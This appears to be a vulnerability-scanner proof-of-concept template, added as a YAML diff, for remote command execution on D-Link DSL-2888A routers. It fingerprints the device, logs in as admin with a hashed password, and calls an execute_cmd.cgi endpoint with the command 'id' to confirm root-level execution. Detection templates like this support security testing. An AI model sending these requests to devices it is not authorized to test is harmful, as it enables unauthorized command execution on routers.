@@ -1,0 +1,43 @@
+id: poc-yaml-dlink-dsl-2888a-rce
+info:
+  name: Dlink Dsl 2888a 远程代码执行漏洞
+  severity: high
+  tags:
+  - rce
+  finger: DLink
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /page/login/login.html
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "text/html") && contains(body, "var ModelName=\"DSL-2888A\";")
+  output: []
+- method: POST
+  path: /
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 302 && contains(headers, "location") && contains(headers,
+    "/page/login/login_fail.html")
+  output: []
+- method: GET
+  path: /cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=id
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "text/html") && contains(body, "uid=0(admin) gid=0(admin)")
+  output: []
